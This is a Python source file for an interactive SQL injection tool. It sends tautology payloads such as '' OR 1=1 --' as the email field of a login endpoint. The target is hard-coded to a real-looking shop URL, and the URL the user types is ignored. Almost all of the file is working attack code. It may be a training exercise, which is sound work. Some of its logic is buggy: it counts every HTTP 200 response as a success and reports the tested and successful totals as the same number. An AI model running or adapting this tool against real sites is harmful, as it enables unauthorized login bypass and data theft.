from dotenv import load_dotenv
import os
import json
from tqdm import tqdm
from rich import print
import requests
from components import clear_screen_and_provide_with_banner
from view.exploit_options import exploit_option

load_dotenv()

base_url = os.environ.get("BASE_URL")


class SQLInjection:
    
    def attack_sql_injection(self, url):
        response_result = {}
        payloads = {
            "default": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"],
            "medium": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"], # read data from file
            "high": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"], # read data from file
        }
        login_url = url + 'rest/user/login'
        search_product_url = url + 'rest/products/search?q='
        new_url = " ";
        selected_payload = []
    
        print("[bold blue]-----------| SQL Injection  |-----------[/bold blue]")
        print(f"Select a page to target: {url}")
        print("[bold green]0. Back to previous option[/bold green]")
        print("[bold green]1. Login page[/bold green]")
        print("[bold green]2. URL Parameters[/bold green]")
        print("[bold green]3. HTTP Headers[/bold green]")
    
        try:
            page_choice = int(input("Please choose a page  (1 or 2): "))
            if page_choice == 0:
                clear_screen_and_provide_with_banner.start();
                exploit_option.Exploit().exploit_option();
            elif page_choice == 1:
                new_url = login_url
                print("[bold yellow]You've selected the Login page option.[/bold yellow]")
            elif page_choice == 2:
                new_url = search_product_url
                print("[bold yellow]You've selected the URL Parameters option.[/bold yellow]")
            elif page_choice == 3:   
                print("[bold yellow]You've selected the HTTP Headers option.[/bold yellow]");
                print("=> This option is under development.. :) )")
            else:
                print("[bold red]Invalid choice. Please select 1 or 2.[/bold red]")
        
            if page_choice in [1, 2, 3]:
                print("Select the level of payloads:")
                print("[bold magenta]1. Default[/bold magenta]")
                print("[bold magenta]2. Medium[/bold magenta]")
                print("[bold magenta]3. High[/bold magenta]")
                level = int(input("Choose any payload option from 1 to 3: "))
        
                if level == 1:
                    selected_payload = payloads["default"]
                elif level == 2:
                    try:
                        with open("payloads/medium_payload", "r") as medium_payload:
                            for line in medium_payload:
                                payloads["medium"].append(line.strip())  # strip newline characters
                    except FileNotFoundError:
                        print("[bold red]File not found![/bold red]")
                    selected_payload = payloads["medium"]
                elif level == 3:
                    try:
                        with open("payloads/high_payload", "r") as high_payload:
                            for line in high_payload:
                                payloads["high"].append(line.strip())  # strip newline characters
                    except FileNotFoundError:
                        print("[bold red]File not found![/bold red]")
                    selected_payload = payloads["high"]
                else:
                    print("[bold red]Invalid level of payload![/bold red]")
        
                with tqdm(total=len(selected_payload), desc="Testing Payloads", unit="payload") as pbar:
                    for payload in selected_payload:
                        params = {'email': payload, 'password': 'password123'}
                        try:
                            response = requests.post(new_url, json=params)
                        except requests.exceptions.RequestException as e:
                            print(e.response)
                        else:
                            if response.status_code == 200:
                                response_result[payload] = response.json()
                        pbar.update(1)
        
                print("[bold blue]---------| SUMMARY |---------[/bold blue]")
                print(f"[bold yellow]Target URL:[/bold yellow] {new_url}")
                if "level" in locals():
                    if level == 1:
                        print(f"[bold yellow]Payload level:[/bold yellow] Default")
                    elif level == 2:
                        print(f"[bold yellow]Payload level:[/bold yellow] Medium")
                    elif level == 3:
                        print(f"[bold yellow]Payload level:[/bold yellow] High")
                    else:
                        print("[bold yellow]Payload level:[/bold yellow] Invalid")
                print(f"[bold yellow]Total number of payloads:[/bold yellow] {len(selected_payload)}")
                print(f"[bold yellow]Total number of payloads tested:[/bold yellow] {len(response_result)}")
                print(f"[bold yellow]Total number of payloads successful:[/bold yellow] {len(response_result)}")
                print(
                    f"[bold yellow]Total number of payloads failed:[/bold yellow] {len(selected_payload) - len(response_result)}")
                print(json.dumps(response_result, indent=4))
                print("[bold blue]---------| END OF SCAN |---------[/bold blue]")
        except ValueError as error:
            pass
        
            


def start_sql_injection():
    target = str(input("[+] Target url: "));
    clear_screen_and_provide_with_banner.start()
    SQLInjection().attack_sql_injection("https://myshop.cstad.shop/");
